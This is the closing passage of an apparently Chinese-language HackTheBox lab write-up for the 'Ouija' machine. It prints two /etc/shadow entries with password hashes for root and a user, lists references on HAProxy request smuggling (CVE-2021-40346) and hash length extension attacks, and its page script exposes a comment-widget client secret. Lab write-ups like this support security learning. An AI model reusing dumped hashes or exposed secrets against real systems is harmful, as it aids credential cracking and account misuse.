<h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T$Kg&#x2F;bsxGg3rtmr7d.HkQ0N&#x2F;$14XejevAukcx9oDmYsXF967olH7um9buAQ3wSGdOCy8:19677:0:99999:7:::</span><br><span class="line">leila:$y$j9T$4G.&#x2F;NwKdILbVGJTvpqros.$Oo7YxsUIGIwiSGpQJdWPCLU1gYw&#x2F;ECzIbN9wJI&#x2F;14K5:19534:0:99999:7:::</span><br></pre></td></tr></table></figure>



<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>alexOarga/CVE-2021-40346: CVE-2021-40346 - HaProxy HTTP request smuggling through integer overflow<br><a href="https://github.com/alexOarga/CVE-2021-40346" target="_blank" rel="noopener">https://github.com/alexOarga/CVE-2021-40346</a></li>
<li>HAProxy vulnerability enables HTTP request smuggling attacks | The Daily Swig<br><a href="https://portswigger.net/daily-swig/haproxy-vulnerability-enables-http-request-smuggling-attacks" target="_blank" rel="noopener">https://portswigger.net/daily-swig/haproxy-vulnerability-enables-http-request-smuggling-attacks</a></li>
<li>Critical vulnerability in HAProxy | JFrog Security Research Team<br><a href="https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/" target="_blank" rel="noopener">https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/</a></li>
<li>Client-Side Desync - PortSwigger - YouTube<br><a href="https://www.youtube.com/watch?v=6wVb6KSmras&amp;ab_channel=Txhaka" target="_blank" rel="noopener">https://www.youtube.com/watch?v=6wVb6KSmras&amp;ab_channel=Txhaka</a></li>
<li>Hash Length Extension Attack - HackTricks<br><a href="https://book.hacktricks.xyz/crypto-and-stego/hash-length-extension-attack" target="_blank" rel="noopener">https://book.hacktricks.xyz/crypto-and-stego/hash-length-extension-attack</a></li>
<li>iagox86/hash_extender<br><a href="https://github.com/iagox86/hash_extender" target="_blank" rel="noopener">https://github.com/iagox86/hash_extender</a></li>
<li>Update Makefile - FIX #24 #22 by Michele0303 · Pull Request #25 · iagox86/hash_extender<br><a href="https://github.com/iagox86/hash_extender/pull/25/commits/62b681af5a86175147de69b473a2a066063461e4" target="_blank" rel="noopener">https://github.com/iagox86/hash_extender/pull/25/commits/62b681af5a86175147de69b473a2a066063461e4</a></li>
</ul>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2024-05-20T02:13:21.863Z" itemprop="dateUpdated">2024-05-20 10:13:21</time>
</span><br>


        
        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
        
    </div>
    
    <footer>
        <a href="https://darkwing.moe">
            <img src="/img/avatar.jpg" alt="暗羽">
            暗羽
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2023/12/05/Ouija-HackTheBox/&title=《Ouija - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2023/12/05/Ouija-HackTheBox/&title=《Ouija - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2023/12/05/Ouija-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Ouija - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2023/12/05/Ouija-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2023/12/05/Ouija-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2023/12/11/Surveillance-HackTheBox/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Surveillance - HackTheBox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2023/11/27/Devvortex-HackTheBox/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Devvortex - HackTheBox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'd35074a248599729ad26',
          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
          repo: 'BlogComments',
          owner: 'zjicmDarkWing',
          admin: ['zjicmDarkWing'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
        </p>
    </div>
    <div class="bottom">
        <p><span>暗羽 &copy; 2014 - 2024</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2023/12/05/Ouija-HackTheBox/&title=《Ouija - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2023/12/05/Ouija-HackTheBox/&title=《Ouija - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2023/12/05/Ouija-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Ouija - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2023/12/05/Ouija-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2023/12/05/Ouija-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACOElEQVR42u3azXLCMAxFYd7/pemWmTbJuZKhWDleMTQYfyxU/fjxwOv5sl7fOf/r73X02aN9Fi8ZMmRsy3ieLvLM0afOD31+Bn42GTJk3IdxtPWq1ySMnofmizPLkCFDxmkYTYMjD8oyZMiQ0Qm4KF3Dad+//d+QIUPGVoy0QdaHpY28ZbW4DBkyNmTwrvvnX79lviFDhoytGKva/SQFTH+m4FQyZMgYzUi/hvN4WUveRzvIkCHjNoxaGCUH6gw7UbIoQ4aMoYxauKwNGmtNOjRGlSFDxmhGZ8TIW/n8mkX6Uy6YlMqQIePrGZ1glz6TtuGCk8iQIWM0o9aaT4tVsjO/KBZX5DJkyNicwRv35yld/8l0hHBRi8uQIWMQI23i11K6WmEc82TIkDGakc4EeYrZKWiXteFkyJAxiNFJzvgiCWhKkiFDxmwGHwx0AvH7LofJkCHjDoxOc5836eIZBRlVpj1CGTJkbM5Ii9h+HsrbcC2eDBkyBjHI1Yc0iUzbZLzcvajCZciQMZqxNonkh+6klX8UsTJkyBjNqF2DICG4Vr7GaaIMGTJuw6iFPx5qO224i2+RIUPGUEb/qkQtBPNmHAriMmTIGM3opGvkOgU/dO1yxoJprQwZMjZhpK1/Pjzgw9Fa4ihDhoy7MWphlAfN2gghOJUMGTJkhCldH0CagOiyhQwZMmSAfWoFKmnkfSjgypAh42sYpIjtp4B8MJmGYxkyZMxmpKVjOgzoH4KPRWXIkDGO8QNi1PoIncC4UwAAAABJRU5ErkJggg==" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
